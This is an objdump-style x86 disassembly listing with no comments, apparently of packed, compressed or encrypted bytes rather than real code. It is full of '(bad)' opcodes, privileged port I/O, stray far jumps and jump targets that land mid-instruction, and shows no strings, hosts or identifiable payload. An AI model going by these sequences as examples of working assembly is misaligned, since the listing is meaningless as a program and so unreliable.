  417fdc:	dec    eax
  417fdd:	xchg   DWORD PTR [ecx+0x150d2cf9],ebp
  417fe3:	push   cs
  417fe4:	or     eax,DWORD PTR [eax+0x46a25872]
  417fea:	jae    0x418006
  417fec:	fnsetpm(287 only) 
  417fee:	popa   
  417fef:	mov    ds:0xb2d0f1e3,al
  417ff4:	jle    0x41802d
  417ff6:	xor    al,0xde
  417ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff9:	test   BYTE PTR [ebx+ecx*8+0x0],dl
  417ffd:	inc    ecx
  417ffe:	jecxz  0x41806d
  418000:	fwait
  418001:	ins    BYTE PTR es:[edi],dx
  418002:	mov    esp,0xfea2663d
  418007:	mov    ecx,0x720a7758
  41800c:	ja     0x418080
  41800e:	inc    ebx
  41800f:	sbb    eax,0xac987b5
  418014:	dec    esi
  418015:	repz mov esi,0x5ca5e66c
  41801b:	popa   
  41801c:	ss pop esp
  41801e:	pop    es
  41801f:	add    al,0x9
  418021:	pop    edi
  418022:	rol    BYTE PTR [edi+0x75],1
  418025:	bound  eax,QWORD PTR [ebx]
  418027:	fucomp st(7)
  418029:	mov    dh,dl
  41802b:	push   edx
  41802c:	(bad)
  41802f:	and    BYTE PTR [eax+0x4ad7d333],al
  418035:	clc    
  418036:	inc    ebp
  418037:	xlat   BYTE PTR ds:[ebx]
  418038:	push   eax
  418039:	mov    edi,0xfe4c06b5
  41803e:	pusha  
  41803f:	sub    DWORD PTR [ebx],esp
  418041:	jbe    0x4180ad
  418043:	cmp    esi,DWORD PTR [eax+0x35823ca9]
  418049:	das    
  41804a:	push   eax
  41804b:	mul    DWORD PTR [edi]
  41804d:	xchg   ecx,eax
  41804e:	xchg   ecx,eax
  41804f:	add    al,0x1f
  418051:	xchg   ecx,eax
  418052:	xor    edx,DWORD PTR fs:[edx-0x12]
  418056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418057:	pop    edx
  418058:	data16 test dh,al
  41805b:	mov    dl,0x64
  41805d:	add    eax,0x43243140
  418062:	and    esi,DWORD PTR [eax+0x69a3ce69]
  418068:	dec    esp
  418069:	mov    bh,0x31
  41806b:	mov    ecx,0x4e9bfd46
  418070:	pop    ebp
  418071:	dec    ecx
  418072:	cmc    
  418073:	mov    al,ds:0xb228f492
  418078:	mov    ecx,DWORD PTR [ebx-0x16]
  41807b:	cmc    
  41807c:	inc    ebx
  41807d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41807e:	mov    DWORD PTR [ecx],edx
  418080:	adc    esp,DWORD PTR [eax+0x35]
  418083:	sub    ch,BYTE PTR [ebp-0x6f]
  418086:	pushf  
  418087:	xchg   edi,eax
  418088:	sbb    BYTE PTR [eax-0x7bb728fa],ch
  41808e:	adc    edi,edi
  418090:	inc    esp
  418091:	rcr    ebx,cl
  418093:	retf   0xcd72
  418096:	mov    esi,0xe7066735
  41809b:	mov    ebp,0x9f608838
  4180a0:	push   ecx
  4180a1:	mov    WORD PTR [esi-0x34],ss
  4180a4:	mov    ebx,0xdd8c7ee0
  4180a9:	or     eax,0x84dfec44
  4180ae:	adc    al,0xca
  4180b0:	retf   
  4180b1:	sub    ebx,DWORD PTR [edi-0x71bd195d]
  4180b7:	xlat   BYTE PTR ds:[ebx]
  4180b8:	jb     0x4180cf
  4180ba:	xchg   edi,eax
  4180bb:	test   esi,esi
  4180bd:	push   esi
  4180be:	push   ebp
  4180bf:	mov    ds:0x6466257a,eax
  4180c4:	cld    
  4180c5:	retf   0xce18
  4180c8:	cmp    ecx,DWORD PTR [edx+edi*8]
  4180cb:	lock dec ecx
  4180cd:	int3   
  4180ce:	pushf  
  4180cf:	in     eax,0xf8
  4180d1:	xlat   BYTE PTR ds:[ebx]
  4180d2:	ror    BYTE PTR [esi+0x22ef3fb1],1
  4180d8:	clc    
  4180d9:	sbb    bh,bl
  4180db:	sysenter 
  4180dd:	inc    esi
  4180de:	xchg   esp,eax
  4180df:	mov    eax,0x90f07d26
  4180e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180e5:	mov    dl,0xa0
  4180e7:	into   
  4180e8:	jg     0x4180b3
  4180ea:	mov    al,ds:0xaf0e440a
  4180ef:	adc    edi,DWORD PTR [ebx+0x6ef7339e]
  4180f5:	inc    esi
  4180f6:	neg    DWORD PTR [eax+0x23]
  4180f9:	mov    ds:0x53818145,eax
  4180fe:	dec    eax
  4180ff:	sbb    ebx,DWORD PTR [edx-0x37]
  418102:	push   ecx
  418103:	or     eax,0x298b610e
  418108:	aad    0xc1
  41810a:	lods   eax,DWORD PTR ds:[esi]
  41810b:	aaa    
  41810c:	dec    eax
  41810d:	je     0x418127
  41810f:	out    0x62,eax
  418111:	fimul  DWORD PTR [eax+0x9762b9d]
  418117:	hlt    
  418118:	push   0x53
  41811a:	xor    al,ah
  41811c:	les    ecx,FWORD PTR [ebp+0x7e]
  41811f:	aas    
  418120:	into   
  418121:	pop    ebp
  418122:	ret    
  418123:	jmp    0xe161:0x826c5276
  41812a:	xor    BYTE PTR [esi+0x6b],ah
  41812d:	mov    esp,0x41f91181
  418132:	dec    edx
  418133:	pop    gs
  418135:	jge    0x418123
  418137:	sbb    ch,BYTE PTR [edi-0x50]
  41813a:	mov    edi,0x50146a29
  41813f:	rol    ah,1
  418141:	dec    ecx
  418142:	sbb    eax,0xfdd2c7ae
  418147:	outs   dx,DWORD PTR ds:[esi]
  418148:	cmp    al,0x90
  41814a:	or     eax,0xe60f54c3
  41814f:	int3   
  418150:	pusha  
  418151:	mov    ch,0xa7
  418153:	dec    eax
  418154:	push   esp
  418155:	add    al,0x4d
  418157:	dec    ecx
  418158:	xor    DWORD PTR [ebx+0x6c],0x89fb45f
  41815f:	lahf   
  418160:	push   0xfcd86d5e
  418165:	mov    ecx,0x10c8220f
  41816a:	test   eax,0xe1e8d2b6
  41816f:	es or  eax,0x50854192
  418175:	pop    ss
  418176:	inc    ebp
  418177:	add    BYTE PTR [ebp-0x25],bl
  41817a:	mov    WORD PTR [ebp-0x20167525],ds
  418180:	pop    ebx
  418181:	sbb    bl,dl
  418183:	sbb    DWORD PTR [edi],0x324d4b1d
  418189:	hlt    
  41818a:	in     al,0xe2
  41818c:	repnz stos BYTE PTR es:[edi],al
  41818e:	ret    0xe6c9
  418191:	lock xchg DWORD PTR [ecx+0x23],esp
  418195:	je     0x418137
  418197:	test   al,0xb
  418199:	pop    ebx
  41819a:	inc    ecx
  41819b:	es mov esi,0x745dc783
  4181a1:	aas    
  4181a2:	mov    eax,ds:0x5b2a8b99
  4181a7:	or     al,0xcb
  4181a9:	sub    ebx,DWORD PTR ds:0x4b96494c
  4181af:	std    
  4181b0:	jl     0x4181d7
  4181b2:	add    al,0x45
  4181b4:	sbb    edi,DWORD PTR [edx*4+0x3048b578]
  4181bb:	mov    esi,0x429c80e4
  4181c0:	or     eax,0x4160fb84
  4181c5:	das    
  4181c6:	xchg   ebx,eax
  4181c7:	push   cs
  4181c8:	or     ecx,DWORD PTR [edx-0x2b]
  4181cb:	bound  esi,QWORD PTR [edx]
  4181cd:	inc    esi
  4181ce:	sbb    DWORD PTR [esi+0x24f404e5],ebp
  4181d4:	pop    ebp
  4181d5:	jnp    0x418241
  4181d7:	push   esi
  4181d8:	push   ebp
  4181d9:	fistp  DWORD PTR [ecx+0x60d7d93b]
  4181df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e0:	or     DWORD PTR [esi],ebx
  4181e2:	shl    BYTE PTR [edx-0x58201fc7],cl
  4181e8:	jg     0x41823b
  4181ea:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4181ec:	cmp    BYTE PTR [edi-0x24],bl
  4181ef:	dec    esi
  4181f0:	pop    edi
  4181f1:	sub    al,0x1f
  4181f3:	outs   dx,BYTE PTR ds:[esi]
  4181f4:	inc    ebx
  4181f5:	sti    
  4181f6:	jge    0x4181ed
  4181f8:	dec    esp
  4181f9:	xor    al,0xdc
  4181fb:	add    eax,0xc90b04cc
  418200:	retf   
  418201:	inc    esp
  418202:	sub    BYTE PTR [edi+eax*4],bl
  418205:	test   DWORD PTR [esp+ecx*1+0x3e4640b0],esi
  41820c:	imul   esp,DWORD PTR [esi],0x2b49cef1
  418212:	pusha  
  418213:	pop    eax
  418214:	and    DWORD PTR [ebx+0x25],ebp
  418217:	cmp    eax,0x971eda36
  41821c:	(bad)  
  41821d:	push   ebp
  41821e:	int3   
  41821f:	data16 hlt 
  418221:	popa   
  418222:	jmp    0x418277
  418224:	xor    BYTE PTR [edi+0x6c],ch
  418227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418228:	sbb    esi,DWORD PTR [edi]
  41822a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41822b:	push   es
  41822c:	mov    ch,0x40
  41822e:	(bad)  
  41822f:	icebp  
  418230:	jl     0x4182a7
  418232:	xor    eax,DWORD PTR [edi]
  418234:	mov    al,ds:0xe1b51152
  418239:	xchg   ebx,eax
  41823a:	test   eax,0x7e51275d
  41823f:	imul   BYTE PTR [ebp+0x13ab4872]
  418245:	es into 
  418247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418248:	push   es
  418249:	xchg   ebx,eax
  41824a:	in     al,0x7c
  41824c:	std    
  41824d:	sar    dh,cl
  41824f:	popa   
  418250:	call   0x8aa7:0xbcc561ad
  418257:	xor    cl,cl
  418259:	add    dl,BYTE PTR ds:0x916b0d12
  41825f:	fs jp  0x4181eb
  418262:	cs ins BYTE PTR es:[edi],dx
  418264:	add    ah,bl
  418266:	pop    ss
  418267:	out    0x25,eax
  418269:	pand   mm6,QWORD PTR [ebp+eax*4+0x577829ff]
  418271:	aas    
  418272:	sub    BYTE PTR [edx+edi*2-0x56ceff2a],bl
  418279:	fmul   DWORD PTR [eax+edi*1-0x63]
  41827d:	mov    DWORD PTR [ecx-0x520dfbbf],edx
  418283:	imul   eax,esi,0xfffffff9
  418286:	jmp    0x4182c0
  418288:	cld    
  418289:	in     al,dx
  41828a:	mov    esi,0xe93776c1
  41828f:	fidiv  WORD PTR [ebp+0x5e]
  418292:	sub    esi,eax
  418294:	retf   0x1cf4
  418297:	mov    al,ds:0xa179100
  41829c:	adc    al,0xd6
  41829e:	rol    BYTE PTR [ebx-0x7d],1
  4182a1:	mov    bh,cl
  4182a3:	stc    
  4182a4:	jp     0x4182c4
  4182a6:	push   esp
  4182a7:	(bad)  
  4182a8:	es jbe 0x4182e9
  4182ab:	add    al,0xc2
  4182ad:	int    0xf3
  4182af:	es arpl bp,cx
  4182b2:	xor    al,0x26
  4182b4:	mov    ds:0x8dcad89,al
  4182b9:	mov    eax,0x4077e776
  4182be:	fwait
  4182bf:	(bad)
  4182c2:	movq   QWORD PTR [edx],mm4
  4182c5:	xchg   ebp,eax
  4182c6:	fistp  QWORD PTR [eax+0x39]
  4182c9:	sub    al,0xe5
  4182cb:	sub    edx,esi
  4182cd:	adc    eax,0xd06d50c8
  4182d2:	push   es
  4182d3:	add    DWORD PTR [esi-0x19],esi
  4182d6:	fistp  WORD PTR [ecx]
  4182d8:	dec    esi
  4182d9:	adc    DWORD PTR [esi+eax*1+0x6636e05f],edi
  4182e0:	sahf   
  4182e1:	nop
  4182e2:	mov    es,WORD PTR [ebp+0x1f]
  4182e5:	mov    al,ds:0x23517f59
  4182ea:	into   
  4182eb:	out    dx,al
  4182ec:	and    ebx,DWORD PTR [ebp+0x7a]
  4182ef:	call   0xca6b:0x3ee1fb35
  4182f6:	stos   BYTE PTR es:[edi],al
  4182f7:	sub    eax,0x60ccb79b
  4182fc:	mov    WORD PTR [esp+ebx*4],gs
  4182ff:	pop    ds
  418300:	loope  0x418337
  418302:	fwait
  418303:	pop    edx
  418304:	mov    esi,0x53310aaa
  418309:	xlat   BYTE PTR ds:[ebx]
  41830a:	push   cs
  41830b:	test   DWORD PTR [ebx-0x659fbd65],esp
  418311:	cmp    eax,0x355de56c
  418316:	(bad)  
  418317:	push   ds
  418318:	push   ebx
  418319:	retf   
  41831a:	push   es
  41831b:	jmp    0x2d62:0x865c2d67
  418322:	sbb    BYTE PTR [edi+0x775b7fca],dh
  418328:	push   esp
  418329:	retf   0x48b8
  41832c:	fisub  WORD PTR [edx-0x5e]
  41832f:	push   ds
  418330:	and    BYTE PTR [edx],ah
  418332:	adc    dl,BYTE PTR [ebp-0x5d]
  418335:	adc    eax,0x3cbd107c
  41833a:	pop    es
  41833b:	inc    ebx
  41833c:	loop   0x418346
  41833e:	mov    esp,0xde13d165
  418343:	sbb    al,0xcf
  418345:	or     al,0x35
  418347:	cs int3 
  418349:	push   es
  41834a:	xchg   edx,eax
  41834b:	hlt    
  41834c:	push   edx
  41834d:	cmp    DWORD PTR [edi+0x4b],0xffffff8a
  418351:	dec    edi
  418352:	and    BYTE PTR [ecx-0x66e967ce],bh
  418358:	or     edx,DWORD PTR [ebp+0x15960e29]
  41835e:	xchg   edx,eax
  41835f:	int    0xe7
  418361:	enter  0xee76,0x43
  418365:	and    eax,0x8eaf33f8
  41836a:	hlt    
  41836b:	jo     0x4183c8
  41836d:	popf   
  41836e:	mov    ds:0x1c94bc87,eax
  418373:	cmp    BYTE PTR [edx-0x5c8fd414],0x4f
  41837a:	jg     0x4183df
  41837c:	add    DWORD PTR [ebx],esp
  41837e:	jle    0x41837c
  418380:	fnsave [ecx+edx*1]
  418383:	aad    0x22
  418385:	aad    0x5c
  418387:	pop    edx
  418388:	ins    BYTE PTR es:[edi],dx
  418389:	push   ebp
  41838a:	shl    DWORD PTR [edi-0x18],0x69
  41838e:	cmp    eax,0xcc028710
  418393:	sub    edi,DWORD PTR [ebx]
  418395:	sti    
  418396:	jmp    0x6417:0xa15256af
  41839d:	mov    WORD PTR [edi-0x6f],?
  4183a0:	add    eax,0x762f49f5
  4183a5:	lods   eax,DWORD PTR ds:[esi]
  4183a6:	shl    BYTE PTR [edi],0x74
  4183a9:	jge    0x418413
  4183ab:	jecxz  0x4183aa
  4183ad:	out    dx,eax
  4183ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183af:	out    0xba,al
  4183b1:	mov    edi,0xab9c6060
  4183b6:	xchg   DWORD PTR [edx],ebx
  4183b8:	inc    edi
  4183b9:	bnd ret 0x626a
  4183bd:	adc    al,0x5d
  4183bf:	cdq    
  4183c0:	int    0x9a
  4183c2:	sbb    al,0x58
  4183c4:	xchg   ebx,eax
  4183c5:	fadd   DWORD PTR [ecx+0x64]
  4183c8:	add    al,0x17
  4183ca:	daa    
  4183cb:	js     0x4183ab
  4183cd:	or     eax,0x389acd16
  4183d2:	inc    edx
  4183d3:	stos   DWORD PTR es:[edi],eax
  4183d4:	pop    edi
  4183d5:	xchg   esi,eax
  4183d6:	mov    eax,0x4fc70b55
  4183db:	mov    cl,0x79
  4183dd:	adc    dh,BYTE PTR ds:0xb3dab18
  4183e3:	sbb    BYTE PTR [ecx-0x51],0xc9
  4183e7:	ja     0x41842c
  4183e9:	clc    
  4183ea:	cmp    eax,DWORD PTR [ebx]
  4183ec:	out    dx,al
  4183ed:	cmp    eax,0xf50f8194
  4183f2:	sub    al,0xed
  4183f4:	xchg   esi,eax
  4183f5:	mov    dl,BYTE PTR [ebx-0x4e]
  4183f8:	loope  0x41846f
  4183fa:	mov    cl,0xab
  4183fc:	mov    al,ds:0x5c63e321
  418401:	add    cl,BYTE PTR [ebp-0x66]
  418404:	(bad)  
  418405:	adc    edx,esi
  418407:	push   edx
  418408:	test   BYTE PTR [edi+0x31],ch
  41840b:	sar    DWORD PTR ds:0x2231a722,1
  418411:	mov    dl,0x3d
  418413:	add    dh,bl
  418415:	mov    al,ds:0x9f6030ea
  41841a:	cli    
  41841b:	(bad)  
  41841c:	and    DWORD PTR [edx+0x77],0x3dbb1240
  418423:	mov    bl,0xfa
  418425:	lahf   
  418426:	outs   dx,BYTE PTR ds:[esi]
  418427:	xor    edx,ebp
  418429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41842a:	cld    
  41842b:	adc    al,BYTE PTR [ecx+0x14]
  41842e:	icebp  
  41842f:	jp     0x418427
  418431:	shr    BYTE PTR [edi+0x5b],1
  418434:	push   esp
  418435:	(bad)  [ebx-0x6c71d280]
  41843b:	aaa    
  41843c:	jle    0x4184a7
  41843e:	rcr    DWORD PTR [esi-0x440855e4],0x77
  418445:	push   ss
  418446:	pop    eax
  418447:	jbe    0x41842e
  418449:	xor    DWORD PTR [eax-0x2a],edi
  41844c:	inc    esi
  41844d:	mov    ds:0x2026f890,al
  418452:	popf   
  418453:	icebp  
  418454:	cli    
  418455:	add    eax,0x1afd691
  41845a:	push   esp
  41845b:	jbe    0x418446
  41845d:	(bad)  
  41845e:	mov    esp,0xc52bfc9c
  418463:	popa   
  418464:	mov    gs,WORD PTR [eax+0x4f9869f4]
  41846a:	int3   
  41846b:	pop    gs
  41846d:	xor    ecx,edi
  41846f:	dec    esp
  418470:	xchg   edi,eax
  418471:	adc    DWORD PTR [edx-0x590f859a],eax
  418477:	xor    ecx,edx
  418479:	dec    esi
  41847a:	mov    edx,0xee18d543
  41847f:	or     al,ch
  418481:	dec    esi
  418482:	fnsave [eax+edi*4-0x44]
  418486:	pop    es
  418487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418488:	xchg   DWORD PTR ds:0x564db3ca,esp
  41848e:	inc    ebx
  41848f:	push   esi
  418490:	lea    edx,[eax]
  418492:	into   
  418493:	lahf   
  418494:	and    edi,eax
  418496:	mov    ebp,0x915b4d1c
  41849b:	mov    cl,0x5
  41849d:	mov    dh,0xe9
  41849f:	in     eax,dx
  4184a0:	(bad)  
  4184a1:	ret    
  4184a2:	lods   al,BYTE PTR ds:[esi]
  4184a3:	sar    BYTE PTR [edx+0x1b],0x89
  4184a7:	jecxz  0x41851a
  4184a9:	jmp    0x2bce8441
  4184ae:	outs   dx,BYTE PTR ds:[esi]
  4184af:	jp     0x4184b1
  4184b1:	cdq    
  4184b2:	dec    ebp
  4184b3:	(bad)  
  4184b4:	gs icebp 
  4184b6:	call   0x3e130e98
  4184bb:	mov    edx,0x240c9c56
  4184c0:	xchg   ebx,eax
  4184c1:	push   eax
  4184c2:	dec    edx
  4184c3:	(bad)
  4184c8:	iret   
  4184c9:	fadd   DWORD PTR [ebx+0x65d556fb]
  4184cf:	cwde   
  4184d0:	inc    ebp
  4184d1:	sar    DWORD PTR [esi-0x7f],cl
  4184d4:	sub    esp,DWORD PTR [ebx+0x48de2707]
  4184da:	inc    ebp
  4184db:	mov    ds,ebp
  4184dd:	push   eax
  4184de:	fdivp  st(7),st
  4184e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e1:	popf   
  4184e2:	div    dh
  4184e4:	mov    eax,ds:0x7474e5cb
  4184e9:	pop    edx
  4184ea:	daa    
  4184eb:	dec    eax
  4184ec:	cmp    DWORD PTR [eax],esp
  4184ee:	ja     0x4184ae
  4184f0:	push   0x67
  4184f2:	cli    
  4184f3:	mov    ch,0x2a
  4184f5:	xor    eax,0x1029462d
  4184fa:	out    0xde,al
  4184fc:	mov    bl,dl
  4184fe:	xchg   ecx,eax
  4184ff:	fisub  WORD PTR [edx]
  418501:	pop    ebp
  418502:	es pushf 
  418504:	sub    ah,0x26
  418507:	xor    al,0x67
  418509:	out    dx,eax
  41850a:	or     BYTE PTR [ecx-0x5e1fa4a5],ch
  418510:	aam    0x1f
  418512:	cwde   
  418513:	inc    ecx
  418514:	in     eax,dx
  418515:	test   BYTE PTR [eax+0x63],0x2
  418519:	jae    0x418526
  41851b:	dec    esi
  41851c:	pop    edx
  41851d:	pop    es
  41851e:	out    dx,al
  41851f:	adc    dh,BYTE PTR [ebx-0x7a]
  418522:	and    ecx,ecx
  418524:	stc    
  418525:	mov    al,ds:0x17adff56
  41852a:	mov    ebp,0x52c6589b
  41852f:	imul   edx,DWORD PTR [ebx+0x1ceeadbe],0xdf8c65f3
  418539:	arpl   WORD PTR [esi],di
  41853b:	std    
  41853c:	ret    0xa9a6
  41853f:	loop   0x41851a
  418541:	scas   eax,DWORD PTR es:[edi]
  418542:	test   BYTE PTR [ebx+0x42c54964],bl
  418548:	pop    edx
  418549:	mov    bl,0x6e
  41854b:	je     0x418596
  41854d:	sbb    al,0x31
  41854f:	mov    bl,BYTE PTR ss:[edi+0x52]
  418553:	je     0x4184f1
  418555:	cli    
  418556:	jo     0x418506
  418558:	leave  
  418559:	pcmpgtb mm3,QWORD PTR [esi+eiz*4-0x1ff05560]
  418561:	paddd  mm7,QWORD PTR [edx-0x4f2154a8]
  418568:	rol    DWORD PTR [eax+edi*8+0x34b6d8bb],cl
  41856f:	xor    edi,DWORD PTR [ebx]
  418571:	cmc    
  418572:	lds    ecx,FWORD PTR [esi-0x44]
  418575:	pop    ebx
  418576:	sbb    ebx,DWORD PTR [edi]
  418578:	cli    
  418579:	xor    DWORD PTR [eax],eax
  41857b:	jmp    0x4219:0x83c889bf
  418582:	pop    eax
  418583:	xor    eax,0xe13c6e4c
  418588:	jle    0x41854e
  41858a:	leave  
  41858b:	sub    dl,BYTE PTR [esi-0x29]
  41858e:	aaa    
  41858f:	adc    esi,esp
  418591:	push   cs
  418592:	test   eax,0xe6837405
  418597:	adc    eax,0xcdc6e21b
  41859c:	stc    
  41859d:	inc    esp
  41859e:	or     eax,0x49b7ffe6
  4185a3:	hlt    
  4185a4:	out    dx,eax
  4185a5:	xor    eax,0x6fdc2015
  4185aa:	div    BYTE PTR [bx+di+0x4d]
  4185ae:	out    dx,al
  4185af:	retf   0x1b47
  4185b2:	add    BYTE PTR [ebp-0x6e],cl
  4185b5:	sar    edi,1
  4185b7:	or     ecx,DWORD PTR [esi+0x345055e4]
  4185bd:	loop   0x41856c
  4185bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c0:	adc    al,0x71
  4185c2:	rcl    DWORD PTR [edx],1
  4185c4:	lock inc ebx
  4185c6:	push   ebx
  4185c7:	aad    0x97
  4185c9:	dec    ecx
  4185ca:	fisttp WORD PTR [eax]
  4185cc:	jbe    0x4185bd
  4185ce:	fisttp DWORD PTR cs:[ecx-0x22]
  4185d2:	sti    
  4185d3:	jle    0x418565
  4185d5:	test   edx,ecx
  4185d7:	(bad)  
  4185d8:	adc    al,0x81
  4185da:	dec    edx
  4185db:	xchg   esp,eax
  4185dc:	gs inc esi
  4185de:	scas   al,BYTE PTR es:[edi]
  4185df:	inc    esp
  4185e0:	leave  
  4185e1:	jae    0x4185a3
  4185e3:	test   eax,0xbad8236c
  4185e8:	adc    DWORD PTR ds:0xd4255ff0,ebp
  4185ee:	pop    DWORD PTR [edi]
  4185f0:	xchg   ecx,eax
  4185f1:	dec    ebx
  4185f2:	sub    BYTE PTR [ecx+ebp*1+0x36410129],dl
  4185f9:	or     BYTE PTR [ecx+0x145e4e04],ah
  4185ff:	xchg   ebx,eax
  418600:	push   esi
  418601:	jl     0x4185f5
  418603:	out    0x72,eax
  418605:	out    dx,al
  418606:	inc    edx
  418607:	add    dl,BYTE PTR [edi-0x73]
  41860a:	enter  0x274a,0x94
  41860e:	std    
  41860f:	push   esp
  418610:	dec    ebx
  418611:	xchg   ah,dh
  418613:	imul   ecx,esp,0xa02828ea
  418619:	mov    bh,0xab
  41861b:	mov    eax,0x315bd044
  418620:	in     al,0xf4
  418622:	or     eax,0xb06d110f
  418627:	sub    eax,0x58a44968
  41862c:	(bad)  
  41862d:	aaa    
  41862e:	lahf   
  41862f:	cmp    eax,0xe767084
  418634:	mov    bh,0x84
  418636:	test   BYTE PTR [esi+ebx*1+0x53],dl
  41863a:	ins    DWORD PTR es:[edi],dx
  41863b:	(bad)  
  41863c:	clc    
  41863d:	jnp    0x418632
  41863f:	loop   0x418607
  418641:	lea    eax,[ecx]
  418643:	sub    eax,0x2786602f
  418648:	fwait
  418649:	jp     0x41862d
  41864b:	adc    dl,ah
  41864d:	add    al,0x8a
  41864f:	push   0x3
  418651:	push   eax
  418652:	and    eax,0x14036439
  418657:	adc    DWORD PTR gs:[ecx+0x70f38b18],esp
  41865e:	pop    ss
  41865f:	scas   eax,DWORD PTR es:[edi]
  418660:	hlt    
  418661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418662:	jne    0x4186c3
  418664:	xchg   ebx,eax
  418665:	repnz popf 
  418667:	or     edi,DWORD PTR [esi-0x70]
  41866a:	fstp   QWORD PTR [edx-0x74]
  41866d:	jecxz  0x41864a
  41866f:	push   ds
  418670:	inc    esp
  418671:	leave  
  418672:	jp     0x418690
  418674:	xchg   esi,eax
  418675:	push   esi
  418676:	inc    eax
  418677:	jbe    0x418671
  418679:	lods   eax,DWORD PTR ds:[esi]
  41867a:	sub    cl,BYTE PTR [eax]
  41867c:	scas   eax,DWORD PTR es:[edi]
  41867d:	dec    edi
  41867e:	or     esp,DWORD PTR [ebp-0x71]
  418681:	in     al,0xae
  418683:	pop    DWORD PTR [ebp+edi*1+0x16]
  418687:	in     al,0xff
  418689:	(bad)  
  41868a:	adc    eax,0x8d7692d4
  41868f:	or     edi,DWORD PTR [ebp-0x51edf298]
  418695:	sar    BYTE PTR [ebx+eax*1],0x55
  418699:	mov    BYTE PTR [eax+eiz*8-0x11],dl
  41869d:	sbb    DWORD PTR [edi-0x3fa67724],0x7e82c470
  4186a7:	jno    0x4186f0
  4186a9:	hlt    
  4186aa:	cdq    
  4186ab:	lods   al,BYTE PTR ds:[esi]
  4186ac:	sub    esp,ecx
  4186ae:	cmp    al,0x6d
  4186b0:	clc    
  4186b1:	dec    bl
  4186b3:	cwde   
  4186b4:	adc    BYTE PTR [edi],dl
  4186b6:	xchg   ecx,eax
  4186b7:	xchg   WORD PTR [esi],bx
  4186ba:	add    esp,DWORD PTR ds:0xe7845518
  4186c0:	leave  
  4186c1:	inc    edx
  4186c2:	dec    eax
  4186c3:	cdq    
  4186c4:	adc    al,0xef
  4186c6:	loope  0x418714
  4186c8:	or     eax,edi
  4186ca:	hlt    
  4186cb:	mov    bl,0xc3
  4186cd:	popf   
  4186ce:	js     0x418687
  4186d0:	ss in  al,dx
  4186d2:	jbe    0x418752
  4186d4:	pop    ds
  4186d5:	sti    
  4186d6:	rcr    ebp,cl
  4186d8:	pop    ebx
  4186d9:	mov    al,ds:0x15e4896c
  4186de:	inc    ebp
  4186df:	fcmovnu st,st(0)
  4186e1:	xor    DWORD PTR [ebp-0x1a],0x2ef87016
  4186e8:	(bad)  
  4186e9:	and    BYTE PTR [edx-0x7a],dh
  4186ec:	mov    ecx,ecx
  4186ee:	fld    QWORD PTR [esp+edx*1-0x48]
  4186f2:	pop    ss
  4186f3:	jmp    0xc8b3:0x4b21395c
  4186fa:	cmp    ecx,esi
  4186fc:	out    0xad,eax
  4186fe:	hlt    
  4186ff:	mov    BYTE PTR [eax],dl
  418701:	adc    bh,BYTE PTR [esi]
  418703:	mov    esp,0x6dff7c83
  418708:	sub    eax,0x2475c34f
  41870d:	mov    bh,0x68
  41870f:	pop    ebx
  418710:	mov    bh,0x74
  418712:	in     al,dx
  418713:	enter  0xd118,0xfc
  418717:	and    eax,0xda1252e4
  41871c:	xor    bl,BYTE PTR [ebp+0x6373295e]
  418722:	es pop eax
  418724:	fisttp WORD PTR [ebx]
  418726:	call   0x457905c7
  41872b:	push   esp
  41872c:	bnd jle 0x418748
  41872f:	dec    esi
  418730:	das    
  418731:	fcmovbe st,st(7)
  418733:	sub    ch,cl
  418735:	cwde   
  418736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418737:	adc    edx,esi
  418739:	das    
  41873a:	push   cs
  41873b:	mov    BYTE PTR [edi],ah
  41873d:	aas    
  41873e:	cld    
  41873f:	inc    ebp
  418740:	(bad)  
  418741:	popf   
  418742:	xchg   edx,eax
  418743:	ret    
  418744:	inc    ebx
  418745:	je     0x418796
  418747:	pop    edi
  418748:	mov    ebp,0xe4fd6cc4
  41874d:	retf   0x1e39
  418750:	dec    ebp
  418751:	jmp    0xea4d:0xf1653374
  418758:	jo     0x4186f5
  41875a:	cld    
  41875b:	lock out 0xa2,eax
  41875e:	xchg   ebp,eax
  41875f:	addr16 push esp
  418761:	test   ebx,0xc4818bd2
  418767:	sub    eax,0x235a5c6
  41876c:	push   ebx
  41876d:	mov    esp,DWORD PTR [ebp-0x5b10963c]
  418773:	lea    esi,[edi-0x7]
  418776:	sub    dl,dh
  418778:	adc    eax,0x92198211
  41877d:	and    DWORD PTR [edx],ecx
  41877f:	pslld  mm1,QWORD PTR [edi-0x27b7783a]
  418786:	shr    BYTE PTR [ebx-0x63],0x2d
  41878a:	adc    ah,ah
  41878c:	clc    
  41878d:	inc    eax
  41878e:	add    ecx,eax
  418790:	out    dx,al
  418791:	mov    edi,0xa0a7c34d
  418796:	imul   esi,esp,0xfffffffc
  418799:	mov    al,ds:0xc3371437
  41879e:	sbb    eax,0x69042b33
  4187a3:	or     edx,edx
  4187a5:	jle    0x4187b7
  4187a7:	sbb    ecx,DWORD PTR [esi+0x6b]
  4187aa:	and    eax,0x1fc2f8ce
  4187af:	leave  
  4187b0:	push   edx
  4187b1:	push   ebx
  4187b2:	scas   al,BYTE PTR es:[edi]
  4187b3:	sbb    al,0xdf
  4187b5:	shl    dl,cl
  4187b7:	lds    edi,FWORD PTR [esp+ebp*4]
  4187ba:	ret    0x96da
  4187bd:	int3   
  4187be:	jae    0x4187d2
  4187c0:	jnp    0x41879e
  4187c2:	mov    dl,0x37
  4187c4:	pop    eax
  4187c5:	dec    edi
  4187c6:	sub    BYTE PTR [edi],dh
  4187c8:	dec    edi
  4187c9:	xor    eax,0x6b0cbf02
  4187ce:	lods   al,BYTE PTR ds:[esi]
